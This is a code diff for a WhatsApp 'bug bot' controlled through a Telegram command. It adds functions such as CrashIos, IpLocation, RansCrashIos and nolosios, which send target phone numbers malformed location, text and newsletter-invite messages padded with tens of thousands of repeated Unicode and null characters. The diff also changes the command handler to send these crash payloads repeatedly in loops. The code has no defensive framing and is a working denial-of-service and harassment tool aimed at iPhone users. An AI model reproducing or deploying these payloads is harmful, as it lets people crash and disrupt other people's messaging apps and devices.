@@ -2459,6 +2459,275 @@ const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴�
       console.error(err);
    }
 };
+async function CrashIos(target) {
+ 
+    await sock.relayMessage(
+      target,
+      {
+        locationMessage: {
+          degreesLatitude: 21.1266,
+          degreesLongitude: -11.8199,
+          name: " 鈥硷笍鈨燄潟攫潠擆潚婐潠櫶μ攫潠嵧� 覊覉鈨濃優鈨熲儬鈨り櫚隀碴櫛\n" + "\u0000".repeat(25000) + "饝噦饝喌饝喆饝喛".repeat(60000),
+          url: "https://t.me/Snitchezs",
+          contextInfo: {
+            externalAdReply: {
+              quotedAd: {
+                advertiserName: "饝噦饝喌饝喆饝喛".repeat(60000),
+                mediaType: "IMAGE",
+                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
+                caption: " 鈥硷笍鈨燄潟锯儼谭饾枔饾拪饾枡苔叹蛨蛨蛨蛨饾枍廷 覊覉鈨濃優鈨熲儬鈨り櫚隀碴櫛" + "饝噦饝喌饝喆饝喛".repeat(60000),
+              },
+              placeholderKey: {
+                remoteJid: "0s.whatsapp.net",
+                fromMe: false,
+                id: "ABCDEF1234567890"
+              }
+            }
+          }
+        }
+      },
+      {
+        participant: { jid: target }
+      }
+    );
+  }        
+  
+async function TxIos(target, Ptcp = false) {
+			await sock.relayMessage(target, {
+					"extendedTextMessage": {
+						"text": "🩸 👀༑𝐒͡𝐡͢𝐢𝐫͡𝐨𝐲͢͡𝐱 Ϟ 𝐁͢𝐨͡𝐭ཀ͜͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃",
+						"contextInfo": {
+							"stanzaId": "1234567890ABCDEF",
+							"participant": "13135550002@s.whatsapp.net",
+							"quotedMessage": {
+								"callLogMesssage": {
+									"isVideo": true,
+									"callOutcome": "1",
+									"durationSecs": "0",
+									"callType": "REGULAR",
+									"participants": [{
+										"jid": "13135550002@s.whatsapp.net",
+										"callOutcome": "1"
+									}]
+								}
+							},
+							"remoteJid": target,
+							"conversionSource": "source_example",
+							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
+							"conversionDelaySeconds": 10,
+							"forwardingScore": 9999999,
+							"isForwarded": true,
+							"quotedAd": {
+								"advertiserName": "Example Advertiser",
+								"mediaType": "IMAGE",
+								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
+								"caption": "This is an ad caption"
+							},
+							"placeholderKey": {
+								"remoteJid": "13135559098@s.whatsapp.net",
+								"fromMe": false,
+								"id": "ABCDEF1234567890"
+							},
+							"expiration": 86400,
+							"ephemeralSettingTimestamp": "1728090592378",
+							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
+							"externalAdReply": {
+								"title": "🩸 𝐑👀༑𝐒͡𝐡͢𝐢𝐫͡𝐨𝐲͢͡𝐱 Ϟ 𝐁͢𝐨͡𝐭ཀ͜͡-𝐈ͯ𝐃̤",
+								"body": "Zaa Trash-Iosϟ",
+								"mediaType": "VIDEO",
+								"renderLargerThumbnail": true,
+								"previewTtpe": "VIDEO",
+								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
+								"sourceType": " x ",
+								"sourceId": " x ",
+								"sourceUrl": "https://www.instagram.com/raditx7",
+								"mediaUrl": "https://www.instagram.com/raditx7",
+								"containsAutoReply": true,
+								"renderLargerThumbnail": true,
+								"showAdAttribution": true,
+								"ctwaClid": "ctwa_clid_example",
+								"ref": "ref_example"
+							},
+							"entryPointConversionSource": "entry_point_source_example",
+							"entryPointConversionApp": "entry_point_app_example",
+							"entryPointConversionDelaySeconds": 5,
+							"disappearingMode": {},
+							"actionLink": {
+								"url": "https://www.instagram.com/raditx7"
+							},
+							"groupSubject": "Example Group Subject",
+							"parentGroupJid": "6287888888888-1234567890@g.us",
+							"trustBannerType": "trust_banner_example",
+							"trustBannerAction": 1,
+							"isSampled": false,
+							"utm": {
+								"utmSource": "utm_source_example",
+								"utmCampaign": "utm_campaign_example"
+							},
+							"forwardedNewsletterMessageInfo": {
+								"newsletterJid": "6287888888888-1234567890@g.us",
+								"serverMessageId": 1,
+								"newsletterName": " X ",
+								"contentType": "UPDATE",
+								"accessibilityText": " X "
+							},
+							"businessMessageForwardInfo": {
+								"businessOwnerJid": "0@s.whatsapp.net"
+							},
+							"smbClientCampaignId": "smb_client_campaign_id_example",
+							"smbServerCampaignId": "smb_server_campaign_id_example",
+							"dataSharingContext": {
+								"showMmDisclosure": true
+							}
+						}
+					}
+				},
+				Ptcp ? {
+					participant: {
+						jid: target
+					}
+				} : {}
+			);
+		};
+
+async function IpLocation(target) {
+  try {
+    const IphoneCrash = " 👀༑𝐒͡𝐡͢𝐢𝐫͡𝐨𝐲͢͡𝐱 Ϟ 𝐁͢𝐨͡𝐭ཀ͜͢͡ " + "𑇂𑆵𑆴𑆿".repeat(60000);
+    await sock.relayMessage(target, {
+      locationMessage: {
+        degreesLatitude: 11.11,
+        degreesLongitude: -11.11,
+        name: "\u0000               " + IphoneCrash,
+        url: "https://youtube.com/@XYRO_REAL"
+      }
+    }, Ptcp ? {
+      participant: {
+    	jid: target
+		}
+		} : {});
+  } catch (error) {
+    console.error("ERROR SENDING IOSTRAVA:", error);
+  }
+}	
+
+async function RInvisIphone(target) {
+sock.relayMessage(
+target,
+{
+  extendedTextMessage: {
+    text: "ꦾ".repeat(55000),
+    contextInfo: {
+      stanzaId: target,
+      participant: target,
+      quotedMessage: {
+        conversation: "👀༑𝐒͡𝐡͢𝐢𝐫͡𝐨𝐲͢͡𝐱 Ϟ 𝐁͢𝐨͡𝐭ཀ͜͡" + "ꦾ࣯࣯".repeat(50000),
+      },
+      disappearingMode: {
+        initiator: "CHANGED_IN_CHAT",
+        trigger: "CHAT_SETTING",
+      },
+    },
+    inviteLinkGroupTypeV2: "DEFAULT",
+  },
+},
+{
+  paymentInviteMessage: {
+    serviceType: "UPI",
+    expiryTimestamp: Date.now() + 5184000000,
+  },
+},
+Ptcp ? {
+participant: {
+jid: target
+}
+} : {},
+{
+  messageId: null,
+}
+);
+}
+
+async function ransblankip(target) {
+    try {
+        const messsage = {
+            botInvokeMessage: {
+                message: {
+                    newsletterAdminInviteMessage: {
+                        newsletterJid: `33333333333333333@newsletter`,
+                        newsletterName: "👀༑𝐒͡𝐡͢𝐢𝐫͡𝐨𝐲͢͡𝐱 Ϟ 𝐁͢𝐨͡𝐭ཀ͜͡?" + "ી".repeat(12000),
+                        jpegThumbnail: "",
+                        caption: "ꦽ".repeat(12000),
+                        inviteExpiration: Date.now() + 1814400000,
+                    },
+                },
+            },
+        };
+        await sock.relayMessage(target, messsage, {
+            userJid: target,
+        });
+    }
+    catch (err) {
+        console.log(err);
+    }
+}
+
+async function RansCrashIos(target) {
+                   try {
+                           const IphoneCrash = "𑇂𑆵𑆴𑆿".repeat(60000);
+                           await sock.relayMessage(target, {
+                                   locationMessage: {
+                                           degreesLatitude: 11.11,
+                                           degreesLongitude: -11.11,
+                                           name: "👀༑𝐒͡𝐡͢𝐢𝐫͡𝐨𝐲͢͡𝐱 Ϟ 𝐁͢𝐨͡𝐭ཀ͜͢͡ 𝐈͡𝐎𝐒͜" + IphoneCrash,
+                                           url: "https://youtube.com/@XYRO_REAL"
+                                   }
+                           }, {
+			                  participant: {
+						      jid: target
+		              		  }
+                           });
+                           console.log("Send Bug By Xa light");
+                   } catch (error) {
+                           console.error("Error Sending Bug:", error);
+                   }
+}
+
+async function nolosios(target) {
+sock.relayMessage(
+target,
+{
+  extendedTextMessage: {
+    text: "ꦾ".repeat(55000) + "@1".repeat(50000),
+    contextInfo: {
+      stanzaId: target,
+      participant: target,
+      quotedMessage: {
+        conversation: "👀༑𝐒͡𝐡͢𝐢𝐫͡𝐨𝐲͢͡𝐱 Ϟ 𝐁͢𝐨͡𝐭ཀ͜͡" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(50000),
+      },
+      disappearingMode: {
+        initiator: "CHANGED_IN_CHAT",
+        trigger: "CHAT_SETTING",
+      },
+    },
+    inviteLinkGroupTypeV2: "DEFAULT",
+  },
+},
+{
+  paymentInviteMessage: {
+    serviceType: "UPI",
+    expiryTimestamp: Date.now() + 5184000000,
+  },
+},
+{
+participant: {
+jid: target
+}
+}, 
+{
+  messageId: null,
+}
+);
+}     
 async function CosmoApiDelay(target, mention = true) { // Default true biar otomatis nyala
     const delaymention = Array.from({ length: 30000 }, (_, r) => ({
         title: "᭡꧈".repeat(95000),
@@ -4020,11 +4289,13 @@ async function VampBroadcast(target, mention = true) { // Default true biar otom
     }
 }
 async function VampireIOS(target) {
-for (let i = 0; i < 10; i++) {
-await VampireCrashiPhone(target);
-await VampireiPhone(target);
-await VampireInvisIphone(target);
-await VampireBlankIphone(target);
+for (let i = 0; i < 20; i++) {
+await RansCrashIos(target);
+await nolosios(target);
+await IpLocation(target);
+await ransblankip(target);
+await iosinVisFC(target);
+await RInvisIphone(target);
 }
 };
 async function VampOri(target) {
@@ -4473,10 +4744,8 @@ bot.onText(/\/ranzios(?:\s(.+))?/, async (msg, match) => {
     });
 
     // Proses pengiriman bug
-    for (let i = 0; i < 50; i++) { // Kirim 3 kali langsung
-        await iosinVisFC(formatedNumber)
-        await new Promise((resolve) => setTimeout(resolve, 2000));
-        await IosBug(formatedNumber)
+    for (let i = 0; i < 20; i++) { // Kirim 3 kali langsung
+        await VampireIOS(formatedNumber)
         await new Promise((resolve) => setTimeout(resolve, 1000));
         console.log(chalk.red("Send Bug Succes"))
     }
